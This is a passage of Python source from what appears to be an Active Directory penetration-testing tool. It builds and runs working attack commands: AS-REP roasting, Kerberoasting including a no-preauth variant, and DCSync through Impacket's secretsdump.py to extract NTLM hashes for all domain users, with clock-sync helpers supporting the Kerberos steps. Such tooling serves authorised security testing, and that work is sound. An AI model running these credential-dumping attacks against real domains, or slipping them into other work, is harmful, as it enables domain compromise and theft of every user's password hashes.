        run_asreproast(shell, target_domain, auto_crack=auto_crack)
    else:
        pdc = shell.domains_data.get(target_domain, {}).get("pdc", "N/A")
        auth_type = shell.domains_data[target_domain]["auth"]
        print_info_verbose(f"Auth type: {auth_type}")
        if auth_type == "auth" or auth_type == "pwned":
            username = shell.domains_data.get(shell.domain or "", {}).get(
                "username", "N/A"
            )
        else:
            username = "Unauthenticated"

        if confirm_operation(
            operation_name="AS-REP Roasting Attack",
            description="Retrieves Kerberos AS-REP hashes for accounts without pre-authentication",
            context={
                "Domain": target_domain,
                "PDC": pdc,
                "Username": username,
                "Auth Type": auth_type.capitalize(),
                "Target": "Accounts without Kerberos Pre-Auth",
            },
            default=True,
            icon="🎫",
        ):
            run_asreproast(shell, target_domain, auto_crack=auto_crack)


def ask_for_kerberoast(
    shell: KerberosShell, target_domain: str, *, auto_crack: bool = True
) -> None:
    """Prompt user to perform Kerberoasting attack.

    Args:
        shell: Shell instance with workspace and domain configuration.
        target_domain: Target domain name.
        auto_crack: Whether to automatically prompt for cracking.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell.auto:
        run_kerberoast(shell, target_domain, auto_crack=auto_crack)
    else:
        pdc = shell.domains_data.get(target_domain, {}).get("pdc", "N/A")
        domain_credentials = shell.domains_data.get(target_domain, {}) or {}
        username = domain_credentials.get("username") or shell.domains_data.get(
            shell.domain or "", {}
        ).get("username", "N/A")

        if confirm_operation(
            operation_name="Kerberoasting Attack",
            description="Extracts service account TGS tickets for offline password cracking",
            context={
                "Domain": target_domain,
                "PDC": pdc,
                "Username": username,
                "Target": "Service Principal Names (SPNs)",
                "Output": "Crackable Kerberos hashes",
            },
            default=True,
            icon="🎟️",
        ):
            run_kerberoast(shell, target_domain, auto_crack=auto_crack)


def execute_roast(
    shell: KerberosShell,
    command: str,
    domain: str,
    roast_type: str,
    *,
    auto_crack: bool = True,
) -> str | None:
    """Execute a Kerberoast/AS-REP roast command and optionally trigger cracking.

    Important UX note:
        In scan orchestrators (e.g. `run_enumeration`) we often want the step
        "Completed" status to reflect the end of the roast command itself (hash
        extraction + file generation), not the downstream cracking and credential
        processing. For those cases, call with `auto_crack=False` and run cracking
        as a separate step.

    Args:
        shell: Shell instance with workspace and domain configuration.
        command: Roast command to execute.
        domain: Target domain.
        roast_type: Roast type ("kerberoast" or "asreproast").
        auto_crack: If True (default), continue into cracking via `ask_for_cracking`.

    Returns:
        The hashes file path if hashes were produced, otherwise None.
    """
    try:
        completed_process = shell.run_command(command, timeout=300)

        # Check the process output
        if completed_process and completed_process.returncode == 0:
            output_str = completed_process.stdout or ""
            users = _extract_roast_candidate_users_from_stdout(roast_type, output_str)

            return finalize_roast_results(
                shell,
                domain=domain,
                roast_type=roast_type,
                users=users,
                auto_crack=auto_crack,
            )
        else:
            print_error(f"Error attempting to perform {roast_type}")
            if completed_process and completed_process.stderr:
                print_error(completed_process.stderr)
            return None
    except Exception as e:
        telemetry.capture_exception(e)
        if "No such file or directory" in str(e):
            marked_domain = mark_sensitive(domain, "domain")
            print_error(f"No {roast_type}able users found in domain {marked_domain}")
        else:
            print_error(f"Error executing {roast_type}.")
            from adscan_internal.rich_output import print_exception

            print_exception(show_locals=False, exception=e)
        return None


def sync_clock_with_pdc(
    shell: KerberosShell, domain: str, verbose: bool = False
) -> bool:
    """Synchronize local system clock with PDC.

    Args:
        shell: Shell instance with workspace and domain configuration.
        domain: Domain name for which the clock should be synchronized.
        verbose: Whether to emit verbose messages.

    Returns:
        True if clock synchronization is successful, False otherwise.
    """
    from adscan_internal.rich_output import print_exception
    from adscan import _is_full_adscan_container_runtime, _sudo_validate

    # Validate domain format
    if (
        not domain
        or "." not in domain
        or not domain.replace(".", "").replace("-", "").isalnum()
    ):
        if verbose:
            marked_domain = mark_sensitive(domain, "domain")
            print_warning_verbose(
                f"Invalid domain format: {marked_domain}. Expected format: example.com or domain.local"
            )
        return False

    # Avoid spamming repeated clock-sync failures
    disabled_reasons = getattr(shell, "_clock_sync_disabled_reasons", None)
    if isinstance(disabled_reasons, dict) and disabled_reasons.get(domain):
        reason = str(disabled_reasons.get(domain))
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "[kerberos] Clock sync skipped due to prior disable reason: "
            f"domain={marked_domain}, reason={reason}"
        )
        return False

    pdc_ip = shell.domains_data[domain]["pdc"]

    if _is_full_adscan_container_runtime():
        # Docker runtime: perform host clock sync via the host helper socket
        sock_path = os.getenv("ADSCAN_HOST_HELPER_SOCK", "").strip()
        if not sock_path:
            disabled_reasons = getattr(shell, "_clock_sync_disabled_reasons", None)
            if not isinstance(disabled_reasons, dict):
                disabled_reasons = {}
            disabled_reasons[domain] = "host_helper_missing"
            setattr(shell, "_clock_sync_disabled_reasons", disabled_reasons)
            if verbose:
                marked_domain = mark_sensitive(domain, "domain")
                print_warning_verbose(
                    "Clock synchronization requires host privileges, but the host helper socket "
                    f"is not available. Domain: {marked_domain}"
                )
            return False

        try:
            from adscan_internal.host_privileged_helper import (
                HostHelperError,
                host_helper_client_request,
            )

            # Disable host NTP once per session
            if not getattr(shell, "_host_ntp_disabled_once", False):
                ntp_off_resp = host_helper_client_request(
                    sock_path,
                    op="timedatectl_set_ntp",
                    payload={"value": False},
                )
                print_info_debug(
                    "[DEBUG] Host helper timedatectl_set_ntp(false): "
                    f"ok={ntp_off_resp.ok}, rc={ntp_off_resp.returncode}, msg={ntp_off_resp.message!r}"
                )
                if not ntp_off_resp.ok:
                    print_warning_verbose(
                        "Could not disable NTP via timedatectl on the host; clock sync may be unreliable."
                    )
                setattr(shell, "_host_ntp_disabled_once", True)

            ntp_resp = host_helper_client_request(
                sock_path, op="ntpdate", payload={"host": pdc_ip}
            )

            if ntp_resp.ok:
                marked_pdc_ip = mark_sensitive(pdc_ip, "ip")
                print_success_verbose(
                    f"Clock synchronized successfully with PDC {marked_pdc_ip}"
                )
                return True

            # Fallback: try syncing from inside the container
            if (ntp_resp.returncode == 127) or (
                ntp_resp.message and "not found" in ntp_resp.message.lower()
            ):
                ntp_cmd = None
                if shutil.which("ntpdate"):
                    ntp_cmd = f"sudo -n ntpdate {pdc_ip}"
                elif shutil.which("ntpdig"):
                    ntp_cmd = f"sudo -n ntpdig -gq {pdc_ip}"
                if ntp_cmd:
                    marked_pdc_ip = mark_sensitive(pdc_ip, "ip")
                    proc = shell.run_command(ntp_cmd, timeout=60)
                    if proc and proc.returncode == 0:
                        print_success_verbose(
                            f"Clock synchronized successfully with PDC {marked_pdc_ip} "
                            "(container NTP fallback)"
                        )
                        return True

            # Fallback: try RPC-based clock sync
            try:
                if _is_tcp_port_open(shell, pdc_ip, 445):
                    if _sync_clock_via_net_time(shell, pdc_ip, domain=domain):
                        marked_pdc_ip = mark_sensitive(pdc_ip, "ip")
                        print_success_verbose(
                            f"Clock synchronized successfully via RPC using PDC {marked_pdc_ip}"
                        )
                        return True
            except (HostHelperError, OSError):
                pass

            marked_pdc_ip = mark_sensitive(pdc_ip, "ip")
            print_warning(f"Failed to synchronize clock with PDC {marked_pdc_ip}")
            return False
        except (HostHelperError, OSError) as exc:
            telemetry.capture_exception(exc)
            disabled_reasons = getattr(shell, "_clock_sync_disabled_reasons", None)
            if not isinstance(disabled_reasons, dict):
                disabled_reasons = {}
            disabled_reasons[domain] = "host_helper_error"
            setattr(shell, "_clock_sync_disabled_reasons", disabled_reasons)
            if verbose:
                marked_domain = mark_sensitive(domain, "domain")
                print_warning_verbose(
                    f"Clock sync host helper failed for {marked_domain}: {exc}"
                )
            return False

    needs_sudo = os.geteuid() != 0
    if needs_sudo and not _sudo_validate():
        disabled_reasons = getattr(shell, "_clock_sync_disabled_reasons", None)
        if not isinstance(disabled_reasons, dict):
            disabled_reasons = {}
        disabled_reasons[domain] = "sudo_unavailable"
        setattr(shell, "_clock_sync_disabled_reasons", disabled_reasons)
        if verbose:
            marked_domain = mark_sensitive(domain, "domain")
            print_warning_verbose(
                f"Clock synchronization requires elevated privileges. "
                f"Unable to use sudo; skipping clock sync for {marked_domain}."
            )
        return False

    # Disable system NTP only once per session
    timedatectl_cmd = "timedatectl set-ntp false"
    if needs_sudo:
        timedatectl_cmd = f"sudo -n {timedatectl_cmd}"
    try:
        if not getattr(shell, "_system_ntp_disabled_once", False):
            shell.run_command(timedatectl_cmd, timeout=300)
            setattr(shell, "_system_ntp_disabled_once", True)
        ntp_available = _is_ntp_service_available(shell, pdc_ip)
        if ntp_available:
            ntpdate_cmd = f"ntpdate {pdc_ip}"
            if needs_sudo:
                ntpdate_cmd = f"sudo -n {ntpdate_cmd}"
            max_ntpdig_attempts = 3
            attempt = 1
            while attempt <= max_ntpdig_attempts:
                time.sleep(1)
                process = shell.run_command(ntpdate_cmd, timeout=300)
                if process and process.returncode == 0:
                    marked_pdc_ip = mark_sensitive(pdc_ip, "ip")
                    print_success_verbose(
                        f"Clock synchronized successfully with PDC {marked_pdc_ip}"
                    )
                    return True

                error_output = ""
                if process:
                    error_output = (process.stderr or "").strip()
                    if not error_output and process.stdout:
                        error_output = process.stdout.strip()

                if "operation not permitted" in (error_output or "").lower():
                    marked_domain = mark_sensitive(domain, "domain")
                    marked_pdc_ip = mark_sensitive(pdc_ip, "ip")
                    print_warning_debug(
                        f"NTP clock sync not permitted (requires elevated privileges). "
                        f"Falling back to RPC for domain {marked_domain} and pdc {marked_pdc_ip}."
                    )
                    break

                if (
                    "ntpdig: no eligible servers" in error_output
                    and attempt < max_ntpdig_attempts
                ):
                    print_info_verbose(
                        f"ntpdig reported no eligible servers. Retrying clock sync attempt {attempt + 1}/"
                        f"{max_ntpdig_attempts}"
                    )
                    attempt += 1
                    time.sleep(1)
                    continue

                if error_output:
                    marked_domain = mark_sensitive(domain, "domain")
                    marked_pdc_ip = mark_sensitive(pdc_ip, "ip")
                    print_warning(
                        f"Error synchronizing clock: {error_output} for domain {marked_domain} and pdc {marked_pdc_ip}"
                    )
                break
        else:
            marked_pdc_ip = mark_sensitive(pdc_ip, "ip")
            print_warning_debug(
                f"NTP probe did not receive a response from {marked_pdc_ip} (UDP/123 may be blocked or rate-limited). "
                "Attempting RPC fallback."
            )

        if _is_tcp_port_open(shell, pdc_ip, 445):
            if _sync_clock_via_net_time(shell, pdc_ip, domain=domain):
                return True
        else:
            print_warning(
                "Could not connect to SMB/RPC port 445 on the PDC. Unable to use 'net time' fallback."
            )

        marked_pdc_ip = mark_sensitive(pdc_ip, "ip")
        print_warning(f"Failed to synchronize clock with PDC {marked_pdc_ip}")
        return False
    except subprocess.CalledProcessError as e:
        telemetry.capture_exception(e)
        print_error("Error synchronizing clock.")
        print_exception(show_locals=False, exception=e)
        return False


def _is_ntp_service_available(
    shell: KerberosShell, host: str, timeout: int = 3
) -> bool:
    """Check whether the remote host responds to a basic NTP request."""
    try:
        packet = b"\x1b" + 47 * b"\0"
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            sock.sendto(packet, (host, 123))
            sock.recvfrom(512)
        return True
    except OSError:
        return False


def _is_tcp_port_open(
    shell: KerberosShell, host: str, port: int, timeout: int = 3
) -> bool:
    """Check whether a TCP port is reachable."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def _sync_clock_via_net_time(
    shell: KerberosShell, host: str, *, domain: str | None = None
) -> bool:
    """Attempt to sync system clock using Samba's 'net time' command."""
    from adscan import _is_full_adscan_container_runtime, _sudo_validate

    if _is_full_adscan_container_runtime():
        sock_path = os.getenv("ADSCAN_HOST_HELPER_SOCK", "").strip()
        disable_key = domain or host
        if not sock_path:
            disabled_reasons = getattr(shell, "_clock_sync_disabled_reasons", None)
            if not isinstance(disabled_reasons, dict):
                disabled_reasons = {}
            disabled_reasons[disable_key] = "host_helper_missing"
            setattr(shell, "_clock_sync_disabled_reasons", disabled_reasons)
            return False
        try:
            from adscan_internal.host_privileged_helper import (
                HostHelperError,
                host_helper_client_request,
            )

            resp = host_helper_client_request(
                sock_path, op="net_time_set", payload={"host": host}
            )
            return bool(resp.ok)
        except (HostHelperError, OSError):
            return False

    if shutil.which("net") is None:
        print_warning(
            "Cannot synchronize clock via RPC because the 'net' command was not found. "
            "Install samba-common-bin to enable this fallback."
        )
        return False

    # If we already determined that clock sync is not possible for this domain (e.g.,
    # due to missing privileges), skip quietly to avoid repeated warnings during scans.
    disable_key = domain or host
    disabled_reasons = getattr(shell, "_clock_sync_disabled_reasons", None)
    if isinstance(disabled_reasons, dict) and disabled_reasons.get(disable_key):
        return False

    sensitive_kind = (
        "ip" if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host or "") else "hostname"
    )
    marked_host = mark_sensitive(host, sensitive_kind)

    # Setting the system clock requires privileges. Prefer a sudo path (prompt allowed
    # once via _sudo_validate()) and then run with -n to avoid repeated prompts.
    if os.geteuid() == 0:
        command = f"net time set -S {marked_host}"
    else:
        if _sudo_validate():
            command = f"sudo -n net time set -S {marked_host}"
        else:
            # We cannot elevate, so this will consistently fail; disable further attempts.
            if not isinstance(disabled_reasons, dict):
                disabled_reasons = {}
            disabled_reasons[disable_key] = "sudo_unavailable"
            setattr(shell, "_clock_sync_disabled_reasons", disabled_reasons)
            print_warning(
                f"'net time' synchronization requires elevated privileges and could not use sudo. "
                f"Disabling clock sync attempts for {mark_sensitive(disable_key, 'domain' if domain else sensitive_kind)}."
            )
            return False

    process = shell.run_command(command, timeout=120)
    if process and process.returncode == 0:
        marked_host = mark_sensitive(host, sensitive_kind)
        print_success_verbose(
            f"Clock synchronized successfully via RPC using PDC {marked_host}"
        )
        return True

    error_output = ""
    if process:
        error_output = (process.stderr or "").strip()
        if not error_output and process.stdout:
            error_output = process.stdout.strip()

    marked_host = mark_sensitive(host, sensitive_kind)
    if "operation not permitted" in (error_output or "").lower():
        # This is typically a privilege/capability issue (e.g., running without root,
        # sudo not available, or restricted environments). Avoid repeating this for
        # every Kerberos command by disabling further sync attempts.
        if not isinstance(disabled_reasons, dict):
            disabled_reasons = {}
        disabled_reasons[disable_key] = "operation_not_permitted"
        setattr(shell, "_clock_sync_disabled_reasons", disabled_reasons)
    print_warning(
        f"'net time' synchronization failed against {marked_host}: {error_output or 'unknown error'}"
    )
    return False


def run_dcsync(shell: KerberosShell, domain: str, username: str, password: str) -> None:
    """Perform DCSync to extract NTLM hashes of domain users.

    Args:
        shell: Shell instance with workspace and domain configuration.
        domain: Target domain name.
        username: Username for authentication.
        password: Password or hash for authentication.
    """
    from adscan_internal.rich_output import print_operation_header
    from adscan_internal.workspaces import domain_subpath
    from rich.prompt import Prompt
    from adscan import _resolve_domain_key, _normalize_interactive_text
    import shlex

    resolved_domain = _resolve_domain_key(shell.domains_data, domain)
    if not resolved_domain:
        print_error(
            f"Unknown domain: {mark_sensitive(domain, 'domain')}. "
            "Run `domains` to list available domains."
        )
        return
    domain = resolved_domain

    admins = shell.get_domain_admins(domain)
    if shell.domains_data[domain]["auth"] in ["pwned"]:
        default_user = "All"
    else:
        if admins:
            default_user = admins[0]
        else:
            default_user = "Administrator"
    target_user_raw = Prompt.ask(
        "Specify the user to extract NTLM hashes from (type 'All' for all users)",
        default=default_user,
    )
    target_user = _normalize_interactive_text(target_user_raw)
    if not target_user:
        print_warning("No target user specified. Aborting DCSync.")
        return

    disabled = "y"
    auth = shell.build_auth_impacket(username, password, domain, kerberos=False)
    command = ""
    if not shell.impacket_scripts_dir:
        print_error(
            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
        )
        return
    secretsdump_path = os.path.join(shell.impacket_scripts_dir, "secretsdump.py")
    if not os.path.isfile(secretsdump_path) or not os.access(secretsdump_path, os.X_OK):
        print_error(
            f"secretsdump.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
        )
        return

    if password.lower().endswith(".ccache"):
        command = f"KRB5CCNAME={shlex.quote(password)} "
        auth = shell.build_auth_impacket(username, password, domain, kerberos=True)

    # Build a log-safe version of the auth string
    marked_domain = mark_sensitive(domain, "domain")
    marked_username = mark_sensitive(username, "user")
    marked_password = mark_sensitive(password, "password")
    marked_pdc = mark_sensitive(shell.domains_data[domain]["pdc"], "ip")
    marked_pdc_hostname = mark_sensitive(
        shell.domains_data[domain]["pdc_hostname"], "host"
    )
    if password.lower().endswith(".ccache"):
        auth_for_log = (
            f"-k -no-pass {marked_domain}/'{marked_username}'@{marked_pdc_hostname} -k"
        )
    else:
        is_hash = len(password) == 32 and all(
            c in "0123456789abcdef" for c in password.lower()
        )
        auth_for_log = f"{marked_domain}/'{marked_username}'"
        auth_for_log += (
            f"@{marked_pdc} -hashes :{marked_password}"
            if is_hash
            else f":'{marked_password}'@{marked_pdc}"
        )

    # Build command
    if target_user.casefold() == "all" and disabled.lower() == "y":
        command += f"{secretsdump_path} {auth} -just-dc-ntlm -o domains/{domain}/all"
        command_for_log = (
            f"{secretsdump_path} {auth_for_log} -just-dc-ntlm -o domains/{domain}/all"
        )
    else:
        workspace_cwd = shell.current_workspace_dir or os.getcwd()
        dcsync_path = domain_subpath(
            workspace_cwd, shell.domains_dir, domain, shell.dcsync_dir
        )
        if not os.path.exists(dcsync_path):
            os.makedirs(dcsync_path)
        safe_target_user = _normalize_interactive_text(target_user)
        marked_netbios = mark_sensitive(shell.domains_data[domain]["netbios"], "domain")
        marked_target_user = mark_sensitive(target_user, "user")
        command += (
            f"{secretsdump_path} {auth} -just-dc-user "
            f"{shell.domains_data[domain]['netbios']}/{safe_target_user} -just-dc-ntlm"
        )
        command_for_log = (
            f"{secretsdump_path} {auth_for_log} -just-dc-user "
            f"{marked_netbios}/{marked_target_user} -just-dc-ntlm"
        )

    # Professional operation header
    auth_method = (
        "Kerberos (ccache)" if password.lower().endswith(".ccache") else "Password"
    )

    print_operation_header(
        "DCSync Attack",
        details={
            "Domain": mark_sensitive(domain, "domain"),
            "Target User": mark_sensitive(target_user, "user"),
            "Username": mark_sensitive(username, "user"),
            "Authentication": auth_method,
        },
        icon="🔄",
    )

    print_info_debug(f"Command: {command_for_log}")
    marked_target = mark_sensitive(target_user, "user")
    if target_user.casefold() == "all":
        print_info_debug("[dcsync] Target scope: All users")
    else:
        print_info_debug(f"[dcsync] Target scope: single user {marked_target}")

    previous_context = getattr(shell, "_current_dcsync_context", None)
    shell._current_dcsync_context = {
        "domain": domain,
        "username": username,
        "password": password,
        "target_user": target_user,
        "retry_attempted": False,
    }
    try:
        from adscan_internal.cli.secretsdump import execute_secretsdump

        execute_secretsdump(shell, command, domain)
    finally:
        shell._current_dcsync_context = previous_context


def ask_for_dcsync(
    shell: KerberosShell, domain: str, username: str, password: str
) -> None:
    """Prompt user to perform DCSync attack.

    Args:
        shell: Shell instance with workspace and domain configuration.
        domain: Target domain name.
        username: Username for authentication.
        password: Password or hash for authentication.
    """
    from adscan_internal.rich_output import confirm_operation

    pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")

    if confirm_operation(
        operation_name="DCSync Attack",
        description="Replicates Active Directory credentials from the Domain Controller",
        context={
            "Domain": domain,
            "PDC": pdc,
            "Username": username,
            "Privileges Required": "Replication Rights (DCSync)",
            "Target": "Domain credentials database",
        },
        default=True,
        icon="🔄",
    ):
        run_dcsync(shell, domain, username, password)


def do_dcsync(shell: KerberosShell, args: str) -> None:
    """Perform DCSync to extract NTLM hashes of domain users.

    Args:
        shell: Shell instance with workspace and domain configuration.
        args: Command arguments as string (format: "<domain> <username> <password>").

    Usage:
        dcsync <domain> <username> <password>

    Requires that the domain is defined in the domains list and that a username and password
    have been specified for authentication.
    """
    args_list = args.split()
    if len(args_list) != 3:
        print_warning("Usage: dcsync <domain> <username> <password>")
        return
    domain = args_list[0]
    username = args_list[1]
    password = args_list[2]
    run_dcsync(shell, domain, username, password)


def run_kerberoast_preauth(shell: KerberosShell, domain: str, user: str) -> None:
    """Perform pre-authenticated Kerberoasting attack.

    Args:
        shell: Shell instance with workspace and domain configuration.
        domain: Target domain name.
        user: Username for authentication.
    """
    workspace_cwd = shell.current_workspace_dir or shell._get_workspace_cwd()
    cracking_path = domain_subpath(
        workspace_cwd, shell.domains_dir, domain, shell.cracking_dir
    )
    if not os.path.exists(cracking_path):
        os.makedirs(cracking_path)

    users_file_rel = domain_relpath(shell.domains_dir, domain, "users.txt")
    output_file_rel = domain_relpath(
        shell.domains_dir, domain, shell.cracking_dir, "hashes.kerberoast"
    )
    pdc = shell.domains_data[domain]["pdc"]
    pre_command = (
        f"GetUserSPNs.py -no-preauth {user} -request -usersfile {users_file_rel} "
        f"-dc-ip {pdc} {domain}/ -outputfile {output_file_rel}"
    )
    marked_user = mark_sensitive(user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    command = (
        f"GetUserSPNs.py -no-preauth {marked_user} -request -usersfile {users_file_rel} "
        f"-dc-ip {pdc} {marked_domain}/ | grep -vE 'Name|v0.|---|CCache' | "
        f"grep -oP '\\$krb5tgs\\$23\\$\\*\\K[^\\$]*(?=\\$)'"
    )

    print_info(
        f"Generating kerberoastable user list with pre-auth for user {marked_user} "
        f"in domain {marked_domain}"
    )
    print_info_debug(f"Command: {pre_command}")
    try:
        completed_process = shell.run_command(pre_command, timeout=300)

        if completed_process and completed_process.returncode == 0:
            print_success_verbose("Pre-command completed successfully.")
            # Now execute the second command sequentially
            execute_roast(shell, command, domain, "kerberoast", auto_crack=True)
            print_info_verbose(
                f"Grepping kerberoastable users with pre-auth for user {marked_user} "
                f"in domain {marked_domain}"
            )
        else:
            error_message = ""
            if completed_process:
                error_message = (
                    (completed_process.stderr or "").strip()
                    if completed_process.stderr
                    else (completed_process.stdout or "").strip()
                )
            print_error(
                f"Error in pre-command: {error_message if error_message else 'Details not available'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing pre-command.")
        from adscan_internal.rich_output import print_exception

        print_exception(show_locals=False, exception=e)


def ask_for_kerberoast_preauth(shell: KerberosShell, domain: str, user: str) -> None:
    """Prompt user to perform pre-authenticated Kerberoasting attack.

    Args:
        shell: Shell instance with workspace and domain configuration.
        domain: Target domain name.
        user: Username for authentication.
    """
    from adscan_internal.rich_output import confirm_operation

    if shell.auto:
        run_kerberoast_preauth(shell, domain, user)
    else:
        pdc = shell.domains_data.get(domain, {}).get("pdc", "N/A")

        if confirm_operation(
            operation_name="Pre-Authenticated Kerberoasting",
            description="Uses valid credentials to request service tickets for offline cracking",
            context={
                "Domain": domain,
                "PDC": pdc,
                "Username": user,
                "Method": "Pre-authenticated TGS request",
            },
            default=True,
            icon="🔐",
        ):
            run_kerberoast_preauth(shell, domain, user)


def do_kerberoast_preauth(shell: KerberosShell, args: str) -> None:
    """Perform pre-authenticated kerberoast attack for a user in a domain.

    Args:
        shell: Shell instance with workspace and domain configuration.
        args: Command arguments as string (format: "<domain> <user>").

    Usage:
        kerberoast_preauth <domain> <user>

    Requires that the domain is defined in the domains list and that a username
    and password have been specified for authentication.
    """
    args_list = args.split()
    if len(args_list) != 2:
        print_warning("Usage: kerberoast_preauth <domain> <user>")
        return
    domain = args_list[0]
    user = args_list[1]
    run_kerberoast_preauth(shell, domain, user)
